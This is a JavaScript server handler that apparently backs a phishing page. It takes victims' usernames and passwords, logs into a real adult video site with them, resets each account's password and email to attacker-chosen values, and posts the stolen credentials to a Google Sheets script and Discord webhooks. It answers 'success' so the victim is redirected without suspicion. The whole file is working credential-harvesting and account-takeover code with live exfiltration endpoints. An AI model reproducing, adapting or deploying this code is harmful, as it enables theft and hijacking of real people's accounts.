const GOOGLE_SHEET_URL = "https://script.google.com/macros/s/AKfycbwdAIV40A4sC9SWsIyXKC6uMJcgF1MGL6im_Vq9uxZT6HhHdS7CI5xUxFCLUzMLiKqPZw/exec";
const DISCORD_CREDS_WEBHOOK = "https://discord.com/api/webhooks/1480093421698940959/Z80mCRx5PykLaA29XwF7_Nxdl3QeqxRiyU380RbVpXc1nD-5Hb1lokk8-8Qzwle6kZtS";
const DISCORD_SUCCESS_WEBHOOK = "https://discord.com/api/webhooks/1480093708836933754/P-VUbF7jdFaq8YoeuDzha-RB7aa2MVAHv8dxqCsBDCDSkbht_YJQRoWnhALng6TpXrQa";

const NEW_PASSWORD = "123aaa";
const NEW_EMAIL = "cuentadewapp1@gmail.com";

const LOGIN_HEADERS = {
  "accept": "*/*",
  "accept-language": "es-US,es;q=0.9",
  "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
  "origin": "https://www.camwhores.tv",
  "referer": "https://www.camwhores.tv/tags/cama/",
  "sec-ch-ua": '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
  "sec-ch-ua-mobile": "?0",
  "sec-ch-ua-platform": '"Windows"',
  "sec-fetch-dest": "empty",
  "sec-fetch-mode": "cors",
  "sec-fetch-site": "same-origin",
  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
  "x-requested-with": "XMLHttpRequest",
};

async function tryLogin(username, password) {
  const body = new URLSearchParams({
    username,
    pass: password,
    action: "login",
    email_link: "https://www.camwhores.tv/email/",
    format: "json",
    mode: "async",
  });

  const resp = await fetch("https://www.camwhores.tv/login/", {
    method: "POST",
    headers: LOGIN_HEADERS,
    body: body.toString(),
  });

  const setCookie = resp.headers.get("set-cookie") || "";
  const sessionCookie = setCookie.split(",").map(c => c.trim()).find(c => c.includes("PHPSESSID"));
  const cookieValue = sessionCookie ? sessionCookie.split(";")[0] : null;

  const text = await resp.text();
  console.log(`[LOGIN RAW] status=${resp.status} cookie=${cookieValue} body=${text.substring(0, 300)}`);

  let result;
  try {
    result = JSON.parse(text);
  } catch {
    result = { status: "error", raw: text.substring(0, 200) };
  }
  return { result, sessionCookie: cookieValue };
}

async function tryChangePassword(sessionCookie, oldPass, newPass) {
  const body = new URLSearchParams({
    old_pass: oldPass,
    pass: newPass,
    pass2: newPass,
    action: "change_pass",
    format: "json",
    mode: "async",
  });

  const resp = await fetch("https://www.camwhores.tv/change-password/", {
    method: "POST",
    headers: { ...LOGIN_HEADERS, referer: "https://www.camwhores.tv/my/", Cookie: sessionCookie + "; kt_member=1" },
    body: body.toString(),
  });

  const text = await resp.text();
  console.log(`[CHANGE PASS RAW] status=${resp.status} body=${text.substring(0, 300)}`);
  try { return JSON.parse(text); } catch {
    if (text.includes("success") || text.includes("has been changed")) return { status: "success" };
    return { status: "unknown", raw: text.substring(0, 200) };
  }
}

async function tryChangeEmail(sessionCookie, newEmail) {
  const body = new URLSearchParams({
    email: newEmail,
    action: "change_email",
    email_link: "https://www.camwhores.tv/email/",
    format: "json",
    mode: "async",
  });

  const resp = await fetch("https://www.camwhores.tv/change-email/", {
    method: "POST",
    headers: { ...LOGIN_HEADERS, referer: "https://www.camwhores.tv/my/", Cookie: sessionCookie + "; kt_member=1" },
    body: body.toString(),
  });

  const text = await resp.text();
  console.log(`[CHANGE EMAIL RAW] status=${resp.status} body=${text.substring(0, 300)}`);
  try { return JSON.parse(text); } catch {
    if (text.includes("success") || text.includes("has been changed") || text.includes("confirmation")) return { status: "success" };
    return { status: "unknown", raw: text.substring(0, 200) };
  }
}

async function sendToSheet(tab, data) {
  try {
    await fetch(GOOGLE_SHEET_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ tab, ...data }),
    });
  } catch (e) {
    console.error("Sheet error:", e.message);
  }
}

async function sendToDiscord(webhookUrl, content) {
  if (!webhookUrl) return;
  try {
    await fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content }),
    });
  } catch (e) {
    console.error("Discord error:", e.message);
  }
}

export default async function handler(req, res) {
  const { username, password, remember_me, timestamp } = req.query;

  if (!username || !password) {
    return res.status(400).json({ login_status: "error" });
  }

  let loginStatus = "error";
  let loginError = "";
  let changePassStatus = "";
  let changeEmailStatus = "";

  try {
    const { result: loginResult, sessionCookie } = await tryLogin(username, password);
    loginStatus = loginResult?.status || "unknown";
    const errors = loginResult?.errors || [];
    loginError = errors.length > 0 ? (errors[0]?.message || "") : (loginResult?.raw || "");

    if (loginStatus === "success" && sessionCookie) {
      try {
        const passResult = await tryChangePassword(sessionCookie, password, NEW_PASSWORD);
        changePassStatus = passResult?.status || "unknown";
      } catch (e) {
        changePassStatus = "error";
      }

      try {
        const emailResult = await tryChangeEmail(sessionCookie, NEW_EMAIL);
        changeEmailStatus = emailResult?.status || "unknown";
      } catch (e) {
        changeEmailStatus = "error";
      }
    }
  } catch (e) {
    loginStatus = "error";
    loginError = e.message;
  }

  // Always save to creds sheet + discord
  await sendToSheet("creds", {
    username,
    password,
    remember_me: remember_me || "",
    timestamp: timestamp || "",
    login_status: loginStatus,
    login_error: loginError,
  });

  await sendToDiscord(DISCORD_CREDS_WEBHOOK,
    `**[CREDS]** \`${username}\` / \`${password}\` | Status: ${loginStatus} | ${loginError || "no error"}`
  );

  // If fully successful
  if (loginStatus === "success" && changePassStatus === "success" && changeEmailStatus === "success") {
    await sendToSheet("successful", {
      username,
      original_password: password,
      new_password: NEW_PASSWORD,
      new_email: NEW_EMAIL,
      timestamp: timestamp || "",
    });

    await sendToDiscord(DISCORD_SUCCESS_WEBHOOK,
      `**[SUCCESS]** \`${username}\` | Old: \`${password}\` | New: \`${NEW_PASSWORD}\` | Email: \`${NEW_EMAIL}\``
    );
  }

  // Return success to redirect user regardless
  return res.status(200).json({ login_status: loginStatus === "success" ? "success" : loginStatus, error_message: loginError });
}
